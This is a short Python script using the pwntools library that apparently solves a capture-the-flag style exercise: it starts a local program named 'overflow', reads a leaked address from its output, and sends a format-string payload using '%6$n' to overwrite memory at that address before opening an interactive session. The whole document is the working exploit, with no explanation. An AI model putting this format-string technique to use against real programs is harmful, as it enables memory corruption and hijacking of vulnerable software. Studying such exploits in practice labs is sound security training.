from pwn import *

def forc():
    sh = process('./overflow')
    c_addr_line = sh.recvuntil(b'\n', drop=True)
    c_addr = int(c_addr_line, 16)
    print(hex(c_addr))
    payload = p32(c_addr) + b'%012d' + b'%6$n'
    print(payload)
    # gdb.attach(sh)
    sh.sendline(payload)
    print(sh.recv().decode('utf-8', errors='ignore'))
    sh.interactive()
forc()